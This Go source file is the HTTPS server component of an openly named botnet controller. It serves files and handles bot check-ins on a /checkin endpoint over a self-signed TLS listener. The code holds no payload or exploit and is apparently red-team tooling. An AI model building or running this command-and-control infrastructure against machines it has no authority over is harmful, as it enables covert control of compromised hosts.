// Package hsrv - HTTPS Server part of loweffortbotnetcontroller
package hsrv

/*
 * hsrv.go
 * HTTPS Server part of loweffortbotnetcontroller
 * By J. Stuart McMurray
 * Created 20240806
 * Last Modified 20240806
 */

import (
	"context"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"time"

	"github.com/magisterquis/curlrevshell/lib/sstls"
	"github.com/magisterquis/loweffortbotnetcontroller/internal/idmanager"
)

// Timeout is a generic Read and Write timeout for all things HTTP.
const Timeout = 2 * time.Second

// Serve serves HTTPS requests on the given address.  Requests for /checkin
// are handled with files in checkInDir as well as with the IDManager.
// All other requests serve files from filesDir.
func Serve(
	ctx context.Context,
	sl *slog.Logger,
	addr string,
	certFile string,
	filesDir string,
	idm *idmanager.Manager,
	checkInDir string,
	callbackString string,
	maxBody int64,
) error {
	/* Register handlers. */
	mux := http.NewServeMux()
	mux.Handle("/", http.FileServer(http.Dir(filesDir)))
	sl.Debug("Static fileserver initialized", "directory", filesDir)
	mux.Handle(CheckInPattern, http.MaxBytesHandler(
		&checkInHandler{
			sl:             sl,
			idm:            idm,
			checkInDir:     checkInDir,
			callbackString: callbackString,
		},
		maxBody,
	))

	/* Start our listener. */
	var err error
	l, err := sstls.Listen("tcp", addr, "", 0, certFile)
	if nil != err {
		return fmt.Errorf("listening on %s: %w", addr, err)
	}
	sl.Info(
		"HTTPS listener started",
		"address", l.Addr().String(),
		"fingerprint", l.Fingerprint,
	)

	/* Start HTTP service servicing. */
	srv := http.Server{
		Handler:      mux,
		ReadTimeout:  Timeout,
		WriteTimeout: Timeout,
		IdleTimeout:  Timeout,
		BaseContext: func(net.Listener) context.Context {
			return ctx
		},
	}

	ech := make(chan error, 1)
	go func() { ech <- http.Serve(l, mux) }()

	/* Wait for something to go wrong or the context to be done. */
	select {
	case err := <-ech:
		return fmt.Errorf("fatal http server error: %w", err)
	case <-ctx.Done():
	}
	sl.Debug("HTTPS server shutting down", "cause", context.Cause(ctx))

	/* If we're here, context is done.  Kill the server. */
	toctx, cancel := context.WithTimeout(context.Background(), 2*Timeout)
	defer cancel()
	if err := srv.Shutdown(toctx); nil != err {
		return fmt.Errorf("shutting down server: %w", err)
	}

	return nil
}

// Fingerprint returns the TLS cert's fingerprint.
// It does this by listening very briefly for TLS connections, to be as close
// as possible to how Serve generates a cert.
// Pass in the same certFile that is passed to Serve.
func Fingerprint(certFile string) (string, error) {
	/* Start a listener, briefly. */
	l, err := sstls.Listen("tcp", ":0", "", 0, certFile)
	if nil != err {
		return "", fmt.Errorf("starting temporary listener: %w", err)
	}
	defer l.Close()

	/* Send back the Fingerprint. */
	return l.Fingerprint, nil
}
